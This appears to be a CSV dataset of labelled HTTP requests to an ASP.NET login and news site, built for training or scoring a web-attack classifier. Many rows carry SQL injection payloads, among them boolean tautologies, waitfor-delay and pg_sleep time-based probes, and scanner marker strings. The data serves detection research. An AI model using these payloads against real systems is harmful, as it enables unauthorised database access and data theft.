,method,path,body,single_q,double_q,dashes,braces,spaces,badwords,class,prediction_label,prediction_score
20,POST,/login.aspx?ReturnUrl=/logout.aspx,btnLogin=Login&tbPassword=g00dPa%24%24w0rD&tbUsername=hipbddpi&__EVENTARGUMENT=1&__EVENTTARGET=1&__EVENTVALIDATION=/wEWWwLoz/fGCgLStq24BwK3jsrkBALtuvfLDQKC3IeGDAKJlpzeDwKOltTPCALcy6fWCQLcy6fWCQLcy9vqAgLcy9vqAgLcy4/SDwLcy4/SDwLcy6PpCALcy6PpCAKx0o2eCgKx0o2eCgKx0qG1AwKx0qG1AwKx0tXJDAKx0tXJDAKx0snsBQKx0snsBQKx0v2DDQKx0v2DDQKx0pGmBgKx0pGmBgKx0oX9DwKx0oX9DwKx0rmQBwKx0rmQBwKx0u35BQKx0u35BQKx0oGcDQKx0oGcDQKK%2bZMFAor5kwUCivmH2AkCivmH2AkCivm7/wICivm7/wICivmvkgoCivmvkgoCivnDtgMCivnDtgMCivn3zQwCivn3zQwCivnr4AUCivnr4AUCivmfhw0Civmfhw0Civnz7AsCivnz7AsCivnngwMCivnngwMCv5PTxAkCv5PTxAkCv5PHmwECv5PHmwECv5P7vgoCv5P7vgoCv5Pv1QMCv5Pv1QMCv5OD6AwCv5OD6AwCv5O3jwQCv5O3jwQCv5Orog0Cv5Orog0Cv5PfxgYCv5PfxgYCv5OzrgMCv5OzrgMCv5OnxQwCv5OnxQwCkLqx6g8CkLqx6g8CkLqlgQcCkLqlgQcCkLrZJQKQutklApC6zfgJApC6zfgJApC64Z8BApC64Z8BApC6lbIKApC6lbIKApC6ickDApC6ickDApC6vewMApC6vewM5kmGZVkGy5KL08oyC3oE/k/5jE4=&__VIEWSTATE=/wEPDwUKLTIyMzk2OTgxMQ9kFgICAQ9kFgICAQ9kFgQCAQ8WBB4EaHJlZgUKbG9naW4uYXNweB4JaW5uZXJodG1sBQVsb2dpbmQCAw8WBB8AZB4HVmlzaWJsZWhkGAEFHl9fQ29udHJvbHNSZXF1aXJlUG9zdEJhY2tLZXlfXxYBBQ9jYlBlcnNpc3RDb29raWVzwbv%2bQ8XadeewSqHhJbH9z4dvJw==&__VIEWSTATEGENERATOR=C2EE9ABB,0,0,0,0,0,0,bad,good,0.6193
21,POST,/login.aspx,"btnLogin=Login&cbPersistCookie=on&tbPassword=1ACUSTART'""ubikFACUEND&tbUsername=vfprmxgb&__EVENTARGUMENT=1&__EVENTTARGET=1&__EVENTVALIDATION=/wEWWwLoz/fGCgLStq24BwK3jsrkBALtuvfLDQKC3IeGDAKJlpzeDwKOltTPCALcy6fWCQLcy6fWCQLcy9vqAgLcy9vqAgLcy4/SDwLcy4/SDwLcy6PpCALcy6PpCAKx0o2eCgKx0o2eCgKx0qG1AwKx0qG1AwKx0tXJDAKx0tXJDAKx0snsBQKx0snsBQKx0v2DDQKx0v2DDQKx0pGmBgKx0pGmBgKx0oX9DwKx0oX9DwKx0rmQBwKx0rmQBwKx0u35BQKx0u35BQKx0oGcDQKx0oGcDQKK%2bZMFAor5kwUCivmH2AkCivmH2AkCivm7/wICivm7/wICivmvkgoCivmvkgoCivnDtgMCivnDtgMCivn3zQwCivn3zQwCivnr4AUCivnr4AUCivmfhw0Civmfhw0Civnz7AsCivnz7AsCivnngwMCivnngwMCv5PTxAkCv5PTxAkCv5PHmwECv5PHmwECv5P7vgoCv5P7vgoCv5Pv1QMCv5Pv1QMCv5OD6AwCv5OD6AwCv5O3jwQCv5O3jwQCv5Orog0Cv5Orog0Cv5PfxgYCv5PfxgYCv5OzrgMCv5OzrgMCv5OnxQwCv5OnxQwCkLqx6g8CkLqx6g8CkLqlgQcCkLqlgQcCkLrZJQKQutklApC6zfgJApC6zfgJApC64Z8BApC64Z8BApC6lbIKApC6lbIKApC6ickDApC6ickDApC6vewMApC6vewM5kmGZVkGy5KL08oyC3oE/k/5jE4=&__VIEWSTATE=/wEPDwUKLTIyMzk2OTgxMQ9kFgICAQ9kFgICAQ9kFgQCAQ8WBB4EaHJlZgUKbG9naW4uYXNweB4JaW5uZXJodG1sBQVsb2dpbmQCAw8WBB8AZB4HVmlzaWJsZWhkGAEFHl9fQ29udHJvbHNSZXF1aXJlUG9zdEJhY2tLZXlfXxYBBQ9jYlBlcnNpc3RDb29raWVzwbv%2bQ8XadeewSqHhJbH9z4dvJw==&__VIEWSTATEGENERATOR=C2EE9ABB",1,1,0,0,0,0,bad,bad,0.8834
22,POST,/login.aspx,"btnLogin=Login&cbPersistCookie=on&tbPassword=g00dPa%24%24w0rD&tbUsername=1ACUSTART'""1Nf4vACUEND&__EVENTARGUMENT=1&__EVENTTARGET=1&__EVENTVALIDATION=/wEWWwLoz/fGCgLStq24BwK3jsrkBALtuvfLDQKC3IeGDAKJlpzeDwKOltTPCALcy6fWCQLcy6fWCQLcy9vqAgLcy9vqAgLcy4/SDwLcy4/SDwLcy6PpCALcy6PpCAKx0o2eCgKx0o2eCgKx0qG1AwKx0qG1AwKx0tXJDAKx0tXJDAKx0snsBQKx0snsBQKx0v2DDQKx0v2DDQKx0pGmBgKx0pGmBgKx0oX9DwKx0oX9DwKx0rmQBwKx0rmQBwKx0u35BQKx0u35BQKx0oGcDQKx0oGcDQKK%2bZMFAor5kwUCivmH2AkCivmH2AkCivm7/wICivm7/wICivmvkgoCivmvkgoCivnDtgMCivnDtgMCivn3zQwCivn3zQwCivnr4AUCivnr4AUCivmfhw0Civmfhw0Civnz7AsCivnz7AsCivnngwMCivnngwMCv5PTxAkCv5PTxAkCv5PHmwECv5PHmwECv5P7vgoCv5P7vgoCv5Pv1QMCv5Pv1QMCv5OD6AwCv5OD6AwCv5O3jwQCv5O3jwQCv5Orog0Cv5Orog0Cv5PfxgYCv5PfxgYCv5OzrgMCv5OzrgMCv5OnxQwCv5OnxQwCkLqx6g8CkLqx6g8CkLqlgQcCkLqlgQcCkLrZJQKQutklApC6zfgJApC6zfgJApC64Z8BApC64Z8BApC6lbIKApC6lbIKApC6ickDApC6ickDApC6vewMApC6vewM5kmGZVkGy5KL08oyC3oE/k/5jE4=&__VIEWSTATE=/wEPDwUKLTIyMzk2OTgxMQ9kFgICAQ9kFgICAQ9kFgQCAQ8WBB4EaHJlZgUKbG9naW4uYXNweB4JaW5uZXJodG1sBQVsb2dpbmQCAw8WBB8AZB4HVmlzaWJsZWhkGAEFHl9fQ29udHJvbHNSZXF1aXJlUG9zdEJhY2tLZXlfXxYBBQ9jYlBlcnNpc3RDb29raWVzwbv%2bQ8XadeewSqHhJbH9z4dvJw==&__VIEWSTATEGENERATOR=C2EE9ABB",1,1,0,0,0,0,bad,bad,0.8834
23,GET,/postnews.aspx,,0,0,0,0,0,0,bad,good,0.6193
24,POST,/login.aspx,btnLogin=Login&cbPersistCookie=on&tbPassword=g00dPa%24%24w0rD&tbUsername=-1'%20OR%203*2>(0%2b5%2b276-276)%20--%20&__EVENTARGUMENT=1&__EVENTTARGET=1&__EVENTVALIDATION=/wEWWwLoz/fGCgLStq24BwK3jsrkBALtuvfLDQKC3IeGDAKJlpzeDwKOltTPCALcy6fWCQLcy6fWCQLcy9vqAgLcy9vqAgLcy4/SDwLcy4/SDwLcy6PpCALcy6PpCAKx0o2eCgKx0o2eCgKx0qG1AwKx0qG1AwKx0tXJDAKx0tXJDAKx0snsBQKx0snsBQKx0v2DDQKx0v2DDQKx0pGmBgKx0pGmBgKx0oX9DwKx0oX9DwKx0rmQBwKx0rmQBwKx0u35BQKx0u35BQKx0oGcDQKx0oGcDQKK%2bZMFAor5kwUCivmH2AkCivmH2AkCivm7/wICivm7/wICivmvkgoCivmvkgoCivnDtgMCivnDtgMCivn3zQwCivn3zQwCivnr4AUCivnr4AUCivmfhw0Civmfhw0Civnz7AsCivnz7AsCivnngwMCivnngwMCv5PTxAkCv5PTxAkCv5PHmwECv5PHmwECv5P7vgoCv5P7vgoCv5Pv1QMCv5Pv1QMCv5OD6AwCv5OD6AwCv5O3jwQCv5O3jwQCv5Orog0Cv5Orog0Cv5PfxgYCv5PfxgYCv5OzrgMCv5OzrgMCv5OnxQwCv5OnxQwCkLqx6g8CkLqx6g8CkLqlgQcCkLqlgQcCkLrZJQKQutklApC6zfgJApC6zfgJApC64Z8BApC64Z8BApC6lbIKApC6lbIKApC6ickDApC6ickDApC6vewMApC6vewM5kmGZVkGy5KL08oyC3oE/k/5jE4=&__VIEWSTATE=/wEPDwUKLTIyMzk2OTgxMQ9kFgICAQ9kFgICAQ9kFgQCAQ8WBB4EaHJlZgUKbG9naW4uYXNweB4JaW5uZXJodG1sBQVsb2dpbmQCAw8WBB8AZB4HVmlzaWJsZWhkGAEFHl9fQ29udHJvbHNSZXF1aXJlUG9zdEJhY2tLZXlfXxYBBQ9jYlBlcnNpc3RDb29raWVzwbv%2bQ8XadeewSqHhJbH9z4dvJw==&__VIEWSTATEGENERATOR=C2EE9ABB,1,0,1,1,4,0,bad,bad,0.9997
25,GET,/login.aspx?ReturnUrl=1ACUSTART%20ACUEND,,0,0,0,0,1,0,bad,bad,0.6783
26,GET,/,,0,0,0,0,0,0,bad,good,0.6193
27,POST,/signup.aspx,"btnSignup=Sign%20me%20up&tbPassword=1ACUSTART'""9doYLACUEND&tbUsername=qhdpdcox&__EVENTARGUMENT=1&__EVENTTARGET=1&__EVENTVALIDATION=/wEWWgK42oW1DwLStq24BwK3jsrkBALF97vxAQKJlpzeDwKOltTPCALcy6fWCQLcy6fWCQLcy9vqAgLcy9vqAgLcy4/SDwLcy4/SDwLcy6PpCALcy6PpCAKx0o2eCgKx0o2eCgKx0qG1AwKx0qG1AwKx0tXJDAKx0tXJDAKx0snsBQKx0snsBQKx0v2DDQKx0v2DDQKx0pGmBgKx0pGmBgKx0oX9DwKx0oX9DwKx0rmQBwKx0rmQBwKx0u35BQKx0u35BQKx0oGcDQKx0oGcDQKK%2bZMFAor5kwUCivmH2AkCivmH2AkCivm7/wICivm7/wICivmvkgoCivmvkgoCivnDtgMCivnDtgMCivn3zQwCivn3zQwCivnr4AUCivnr4AUCivmfhw0Civmfhw0Civnz7AsCivnz7AsCivnngwMCivnngwMCv5PTxAkCv5PTxAkCv5PHmwECv5PHmwECv5P7vgoCv5P7vgoCv5Pv1QMCv5Pv1QMCv5OD6AwCv5OD6AwCv5O3jwQCv5O3jwQCv5Orog0Cv5Orog0Cv5PfxgYCv5PfxgYCv5OzrgMCv5OzrgMCv5OnxQwCv5OnxQwCkLqx6g8CkLqx6g8CkLqlgQcCkLqlgQcCkLrZJQKQutklApC6zfgJApC6zfgJApC64Z8BApC64Z8BApC6lbIKApC6lbIKApC6ickDApC6ickDApC6vewMApC6vewMZDoBpcrMyHw3O3NO1Q9dy6PNVyI=&__VIEWSTATE=/wEPDwUKLTY0MzI4NjU4Mw9kFgICAQ9kFgICAQ9kFgQCAQ8WBB4EaHJlZgUKbG9naW4uYXNweB4JaW5uZXJodG1sBQVsb2dpbmQCAw8WBB8AZB4HVmlzaWJsZWhkZLWF2wpV006tz0eDdoKfDbx%2bi81I&__VIEWSTATEGENERATOR=36F90C25",1,1,0,0,2,0,bad,bad,0.9889
28,POST,/login.aspx,"btnLogin=Login&cbPersistCookie=on&tbPassword=0""XOR(if(now()=sysdate()%2csleep(3)%2c0))XOR""Z&tbUsername=xklatmka&__EVENTARGUMENT=1&__EVENTTARGET=1&__EVENTVALIDATION=/wEWWwLoz/fGCgLStq24BwK3jsrkBALtuvfLDQKC3IeGDAKJlpzeDwKOltTPCALcy6fWCQLcy6fWCQLcy9vqAgLcy9vqAgLcy4/SDwLcy4/SDwLcy6PpCALcy6PpCAKx0o2eCgKx0o2eCgKx0qG1AwKx0qG1AwKx0tXJDAKx0tXJDAKx0snsBQKx0snsBQKx0v2DDQKx0v2DDQKx0pGmBgKx0pGmBgKx0oX9DwKx0oX9DwKx0rmQBwKx0rmQBwKx0u35BQKx0u35BQKx0oGcDQKx0oGcDQKK%2bZMFAor5kwUCivmH2AkCivmH2AkCivm7/wICivm7/wICivmvkgoCivmvkgoCivnDtgMCivnDtgMCivn3zQwCivn3zQwCivnr4AUCivnr4AUCivmfhw0Civmfhw0Civnz7AsCivnz7AsCivnngwMCivnngwMCv5PTxAkCv5PTxAkCv5PHmwECv5PHmwECv5P7vgoCv5P7vgoCv5Pv1QMCv5Pv1QMCv5OD6AwCv5OD6AwCv5O3jwQCv5O3jwQCv5Orog0Cv5Orog0Cv5PfxgYCv5PfxgYCv5OzrgMCv5OzrgMCv5OnxQwCv5OnxQwCkLqx6g8CkLqx6g8CkLqlgQcCkLqlgQcCkLrZJQKQutklApC6zfgJApC6zfgJApC64Z8BApC64Z8BApC6lbIKApC6lbIKApC6ickDApC6ickDApC6vewMApC6vewM5kmGZVkGy5KL08oyC3oE/k/5jE4=&__VIEWSTATE=/wEPDwUKLTIyMzk2OTgxMQ9kFgICAQ9kFgICAQ9kFgQCAQ8WBB4EaHJlZgUKbG9naW4uYXNweB4JaW5uZXJodG1sBQVsb2dpbmQCAw8WBB8AZB4HVmlzaWJsZWhkGAEFHl9fQ29udHJvbHNSZXF1aXJlUG9zdEJhY2tLZXlfXxYBBQ9jYlBlcnNpc3RDb29raWVzwbv%2bQ8XadeewSqHhJbH9z4dvJw==&__VIEWSTATEGENERATOR=C2EE9ABB",0,2,0,5,0,1,bad,bad,0.993
29,POST,/login.aspx,btnLogin=Login&cbPersistCookie=on&tbPassword=1ACUSTART%5c&tbUsername=vfprmxgb&__EVENTARGUMENT=1&__EVENTTARGET=1&__EVENTVALIDATION=/wEWWwLoz/fGCgLStq24BwK3jsrkBALtuvfLDQKC3IeGDAKJlpzeDwKOltTPCALcy6fWCQLcy6fWCQLcy9vqAgLcy9vqAgLcy4/SDwLcy4/SDwLcy6PpCALcy6PpCAKx0o2eCgKx0o2eCgKx0qG1AwKx0qG1AwKx0tXJDAKx0tXJDAKx0snsBQKx0snsBQKx0v2DDQKx0v2DDQKx0pGmBgKx0pGmBgKx0oX9DwKx0oX9DwKx0rmQBwKx0rmQBwKx0u35BQKx0u35BQKx0oGcDQKx0oGcDQKK%2bZMFAor5kwUCivmH2AkCivmH2AkCivm7/wICivm7/wICivmvkgoCivmvkgoCivnDtgMCivnDtgMCivn3zQwCivn3zQwCivnr4AUCivnr4AUCivmfhw0Civmfhw0Civnz7AsCivnz7AsCivnngwMCivnngwMCv5PTxAkCv5PTxAkCv5PHmwECv5PHmwECv5P7vgoCv5P7vgoCv5Pv1QMCv5Pv1QMCv5OD6AwCv5OD6AwCv5O3jwQCv5O3jwQCv5Orog0Cv5Orog0Cv5PfxgYCv5PfxgYCv5OzrgMCv5OzrgMCv5OnxQwCv5OnxQwCkLqx6g8CkLqx6g8CkLqlgQcCkLqlgQcCkLrZJQKQutklApC6zfgJApC6zfgJApC64Z8BApC64Z8BApC6lbIKApC6lbIKApC6ickDApC6ickDApC6vewMApC6vewM5kmGZVkGy5KL08oyC3oE/k/5jE4=&__VIEWSTATE=/wEPDwUKLTIyMzk2OTgxMQ9kFgICAQ9kFgICAQ9kFgQCAQ8WBB4EaHJlZgUKbG9naW4uYXNweB4JaW5uZXJodG1sBQVsb2dpbmQCAw8WBB8AZB4HVmlzaWJsZWhkGAEFHl9fQ29udHJvbHNSZXF1aXJlUG9zdEJhY2tLZXlfXxYBBQ9jYlBlcnNpc3RDb29raWVzwbv%2bQ8XadeewSqHhJbH9z4dvJw==&__VIEWSTATEGENERATOR=C2EE9ABB,0,0,0,0,0,0,bad,good,0.6193
30,POST,/login.aspx?ReturnUrl=/postnews.aspx,btnLogin=Login&cbPersistCookie=1ACUSTART%5c&tbPassword=g00dPa%24%24w0rD&tbUsername=xecqewwc&__EVENTARGUMENT=1&__EVENTTARGET=1&__EVENTVALIDATION=/wEWWwLoz/fGCgLStq24BwK3jsrkBALtuvfLDQKC3IeGDAKJlpzeDwKOltTPCALcy6fWCQLcy6fWCQLcy9vqAgLcy9vqAgLcy4/SDwLcy4/SDwLcy6PpCALcy6PpCAKx0o2eCgKx0o2eCgKx0qG1AwKx0qG1AwKx0tXJDAKx0tXJDAKx0snsBQKx0snsBQKx0v2DDQKx0v2DDQKx0pGmBgKx0pGmBgKx0oX9DwKx0oX9DwKx0rmQBwKx0rmQBwKx0u35BQKx0u35BQKx0oGcDQKx0oGcDQKK%2bZMFAor5kwUCivmH2AkCivmH2AkCivm7/wICivm7/wICivmvkgoCivmvkgoCivnDtgMCivnDtgMCivn3zQwCivn3zQwCivnr4AUCivnr4AUCivmfhw0Civmfhw0Civnz7AsCivnz7AsCivnngwMCivnngwMCv5PTxAkCv5PTxAkCv5PHmwECv5PHmwECv5P7vgoCv5P7vgoCv5Pv1QMCv5Pv1QMCv5OD6AwCv5OD6AwCv5O3jwQCv5O3jwQCv5Orog0Cv5Orog0Cv5PfxgYCv5PfxgYCv5OzrgMCv5OzrgMCv5OnxQwCv5OnxQwCkLqx6g8CkLqx6g8CkLqlgQcCkLqlgQcCkLrZJQKQutklApC6zfgJApC6zfgJApC64Z8BApC64Z8BApC6lbIKApC6lbIKApC6ickDApC6ickDApC6vewMApC6vewM5kmGZVkGy5KL08oyC3oE/k/5jE4=&__VIEWSTATE=/wEPDwUKLTIyMzk2OTgxMQ9kFgICAQ9kFgICAQ9kFgQCAQ8WBB4EaHJlZgUKbG9naW4uYXNweB4JaW5uZXJodG1sBQVsb2dpbmQCAw8WBB8AZB4HVmlzaWJsZWhkGAEFHl9fQ29udHJvbHNSZXF1aXJlUG9zdEJhY2tLZXlfXxYBBQ9jYlBlcnNpc3RDb29raWVzwbv%2bQ8XadeewSqHhJbH9z4dvJw==&__VIEWSTATEGENERATOR=C2EE9ABB,0,0,0,0,0,0,bad,good,0.6193
31,GET,/login.aspx?ReturnUrl=/logout.aspx,,0,0,0,0,0,0,bad,good,0.6193
32,GET,"/default.aspx?delete=-1""%20OR%202%2b833-833-1=0%2b0%2b0%2b1%20--%20",,0,1,1,0,4,0,bad,bad,0.9886
33,GET,/login.aspx?ReturnUrl=1%20waitfor%20delay%20'0:0:6'%20--%20,,2,0,1,0,5,2,bad,bad,1
34,GET,/default.aspx?delete=-1));select%20pg_sleep(3);%20--%20,,0,0,1,1,3,2,bad,bad,0.9993
35,GET,/login.aspx?ReturnUrl=GAG58bXI');select%20pg_sleep(3);%20--%20,,1,0,1,1,3,2,bad,bad,1
36,POST,/login.aspx,btnLogin=Login&cbPersistCookie=on&tbPassword=1ACUSTART%20ACUEND&tbUsername=vfprmxgb&__EVENTARGUMENT=1&__EVENTTARGET=1&__EVENTVALIDATION=/wEWWwLoz/fGCgLStq24BwK3jsrkBALtuvfLDQKC3IeGDAKJlpzeDwKOltTPCALcy6fWCQLcy6fWCQLcy9vqAgLcy9vqAgLcy4/SDwLcy4/SDwLcy6PpCALcy6PpCAKx0o2eCgKx0o2eCgKx0qG1AwKx0qG1AwKx0tXJDAKx0tXJDAKx0snsBQKx0snsBQKx0v2DDQKx0v2DDQKx0pGmBgKx0pGmBgKx0oX9DwKx0oX9DwKx0rmQBwKx0rmQBwKx0u35BQKx0u35BQKx0oGcDQKx0oGcDQKK%2bZMFAor5kwUCivmH2AkCivmH2AkCivm7/wICivm7/wICivmvkgoCivmvkgoCivnDtgMCivnDtgMCivn3zQwCivn3zQwCivnr4AUCivnr4AUCivmfhw0Civmfhw0Civnz7AsCivnz7AsCivnngwMCivnngwMCv5PTxAkCv5PTxAkCv5PHmwECv5PHmwECv5P7vgoCv5P7vgoCv5Pv1QMCv5Pv1QMCv5OD6AwCv5OD6AwCv5O3jwQCv5O3jwQCv5Orog0Cv5Orog0Cv5PfxgYCv5PfxgYCv5OzrgMCv5OzrgMCv5OnxQwCv5OnxQwCkLqx6g8CkLqx6g8CkLqlgQcCkLqlgQcCkLrZJQKQutklApC6zfgJApC6zfgJApC64Z8BApC64Z8BApC6lbIKApC6lbIKApC6ickDApC6ickDApC6vewMApC6vewM5kmGZVkGy5KL08oyC3oE/k/5jE4=&__VIEWSTATE=/wEPDwUKLTIyMzk2OTgxMQ9kFgICAQ9kFgICAQ9kFgQCAQ8WBB4EaHJlZgUKbG9naW4uYXNweB4JaW5uZXJodG1sBQVsb2dpbmQCAw8WBB8AZB4HVmlzaWJsZWhkGAEFHl9fQ29udHJvbHNSZXF1aXJlUG9zdEJhY2tLZXlfXxYBBQ9jYlBlcnNpc3RDb29raWVzwbv%2bQ8XadeewSqHhJbH9z4dvJw==&__VIEWSTATEGENERATOR=C2EE9ABB,0,0,0,0,1,0,bad,bad,0.6783
37,POST,/login.aspx,btnLogin=Login&tbPassword=1ACUSTART%20ACUEND&tbUsername=vfprmxgb&__EVENTARGUMENT=1&__EVENTTARGET=1&__EVENTVALIDATION=/wEWWwLoz/fGCgLStq24BwK3jsrkBALtuvfLDQKC3IeGDAKJlpzeDwKOltTPCALcy6fWCQLcy6fWCQLcy9vqAgLcy9vqAgLcy4/SDwLcy4/SDwLcy6PpCALcy6PpCAKx0o2eCgKx0o2eCgKx0qG1AwKx0qG1AwKx0tXJDAKx0tXJDAKx0snsBQKx0snsBQKx0v2DDQKx0v2DDQKx0pGmBgKx0pGmBgKx0oX9DwKx0oX9DwKx0rmQBwKx0rmQBwKx0u35BQKx0u35BQKx0oGcDQKx0oGcDQKK%2bZMFAor5kwUCivmH2AkCivmH2AkCivm7/wICivm7/wICivmvkgoCivmvkgoCivnDtgMCivnDtgMCivn3zQwCivn3zQwCivnr4AUCivnr4AUCivmfhw0Civmfhw0Civnz7AsCivnz7AsCivnngwMCivnngwMCv5PTxAkCv5PTxAkCv5PHmwECv5PHmwECv5P7vgoCv5P7vgoCv5Pv1QMCv5Pv1QMCv5OD6AwCv5OD6AwCv5O3jwQCv5O3jwQCv5Orog0Cv5Orog0Cv5PfxgYCv5PfxgYCv5OzrgMCv5OzrgMCv5OnxQwCv5OnxQwCkLqx6g8CkLqx6g8CkLqlgQcCkLqlgQcCkLrZJQKQutklApC6zfgJApC6zfgJApC64Z8BApC64Z8BApC6lbIKApC6lbIKApC6ickDApC6ickDApC6vewMApC6vewM5kmGZVkGy5KL08oyC3oE/k/5jE4=&__VIEWSTATE=/wEPDwUKLTIyMzk2OTgxMQ9kFgICAQ9kFgICAQ9kFgQCAQ8WBB4EaHJlZgUKbG9naW4uYXNweB4JaW5uZXJodG1sBQVsb2dpbmQCAw8WBB8AZB4HVmlzaWJsZWhkGAEFHl9fQ29udHJvbHNSZXF1aXJlUG9zdEJhY2tLZXlfXxYBBQ9jYlBlcnNpc3RDb29raWVzwbv%2bQ8XadeewSqHhJbH9z4dvJw==&__VIEWSTATEGENERATOR=C2EE9ABB,0,0,0,0,1,0,bad,bad,0.6783
38,GET,/readnews.aspx?id=1*941*936*0,,0,0,0,0,0,0,bad,good,0.6193
39,POST,/login.aspx,btnLogin=Login&cbPersistCookie=on&tbPassword=g00dPa%24%24w0rD&tbUsername=-1'%20OR%20276=276%20AND%203%2b1-1-1=1%20--%20&__EVENTARGUMENT=1&__EVENTTARGET=1&__EVENTVALIDATION=/wEWWwLoz/fGCgLStq24BwK3jsrkBALtuvfLDQKC3IeGDAKJlpzeDwKOltTPCALcy6fWCQLcy6fWCQLcy9vqAgLcy9vqAgLcy4/SDwLcy4/SDwLcy6PpCALcy6PpCAKx0o2eCgKx0o2eCgKx0qG1AwKx0qG1AwKx0tXJDAKx0tXJDAKx0snsBQKx0snsBQKx0v2DDQKx0v2DDQKx0pGmBgKx0pGmBgKx0oX9DwKx0oX9DwKx0rmQBwKx0rmQBwKx0u35BQKx0u35BQKx0oGcDQKx0oGcDQKK%2bZMFAor5kwUCivmH2AkCivmH2AkCivm7/wICivm7/wICivmvkgoCivmvkgoCivnDtgMCivnDtgMCivn3zQwCivn3zQwCivnr4AUCivnr4AUCivmfhw0Civmfhw0Civnz7AsCivnz7AsCivnngwMCivnngwMCv5PTxAkCv5PTxAkCv5PHmwECv5PHmwECv5P7vgoCv5P7vgoCv5Pv1QMCv5Pv1QMCv5OD6AwCv5OD6AwCv5O3jwQCv5O3jwQCv5Orog0Cv5Orog0Cv5PfxgYCv5PfxgYCv5OzrgMCv5OzrgMCv5OnxQwCv5OnxQwCkLqx6g8CkLqx6g8CkLqlgQcCkLqlgQcCkLrZJQKQutklApC6zfgJApC6zfgJApC64Z8BApC64Z8BApC6lbIKApC6lbIKApC6ickDApC6ickDApC6vewMApC6vewM5kmGZVkGy5KL08oyC3oE/k/5jE4=&__VIEWSTATE=/wEPDwUKLTIyMzk2OTgxMQ9kFgICAQ9kFgICAQ9kFgQCAQ8WBB4EaHJlZgUKbG9naW4uYXNweB4JaW5uZXJodG1sBQVsb2dpbmQCAw8WBB8AZB4HVmlzaWJsZWhkGAEFHl9fQ29udHJvbHNSZXF1aXJlUG9zdEJhY2tLZXlfXxYBBQ9jYlBlcnNpc3RDb29raWVzwbv%2bQ8XadeewSqHhJbH9z4dvJw==&__VIEWSTATEGENERATOR=C2EE9ABB,1,0,1,0,6,0,bad,bad,0.9999
40,POST,/login.aspx,btnLogin=Login&cbPersistCookie=on&tbPassword=-1%20OR%202%2b842-842-1=0%2b0%2b0%2b1%20--%20&tbUsername=xklatmka&__EVENTARGUMENT=1&__EVENTTARGET=1&__EVENTVALIDATION=/wEWWwLoz/fGCgLStq24BwK3jsrkBALtuvfLDQKC3IeGDAKJlpzeDwKOltTPCALcy6fWCQLcy6fWCQLcy9vqAgLcy9vqAgLcy4/SDwLcy4/SDwLcy6PpCALcy6PpCAKx0o2eCgKx0o2eCgKx0qG1AwKx0qG1AwKx0tXJDAKx0tXJDAKx0snsBQKx0snsBQKx0v2DDQKx0v2DDQKx0pGmBgKx0pGmBgKx0oX9DwKx0oX9DwKx0rmQBwKx0rmQBwKx0u35BQKx0u35BQKx0oGcDQKx0oGcDQKK%2bZMFAor5kwUCivmH2AkCivmH2AkCivm7/wICivm7/wICivmvkgoCivmvkgoCivnDtgMCivnDtgMCivn3zQwCivn3zQwCivnr4AUCivnr4AUCivmfhw0Civmfhw0Civnz7AsCivnz7AsCivnngwMCivnngwMCv5PTxAkCv5PTxAkCv5PHmwECv5PHmwECv5P7vgoCv5P7vgoCv5Pv1QMCv5Pv1QMCv5OD6AwCv5OD6AwCv5O3jwQCv5O3jwQCv5Orog0Cv5Orog0Cv5PfxgYCv5PfxgYCv5OzrgMCv5OzrgMCv5OnxQwCv5OnxQwCkLqx6g8CkLqx6g8CkLqlgQcCkLqlgQcCkLrZJQKQutklApC6zfgJApC6zfgJApC64Z8BApC64Z8BApC6lbIKApC6lbIKApC6ickDApC6ickDApC6vewMApC6vewM5kmGZVkGy5KL08oyC3oE/k/5jE4=&__VIEWSTATE=/wEPDwUKLTIyMzk2OTgxMQ9kFgICAQ9kFgICAQ9kFgQCAQ8WBB4EaHJlZgUKbG9naW4uYXNweB4JaW5uZXJodG1sBQVsb2dpbmQCAw8WBB8AZB4HVmlzaWJsZWhkGAEFHl9fQ29udHJvbHNSZXF1aXJlUG9zdEJhY2tLZXlfXxYBBQ9jYlBlcnNpc3RDb29raWVzwbv%2bQ8XadeewSqHhJbH9z4dvJw==&__VIEWSTATEGENERATOR=C2EE9ABB,0,0,1,0,4,0,bad,bad,0.9908
41,GET,/default.aspx,,0,0,0,0,0,0,bad,good,0.6193
42,GET,/jscripts/tiny_mce/license.txt,,0,0,0,0,0,0,bad,good,0.6193
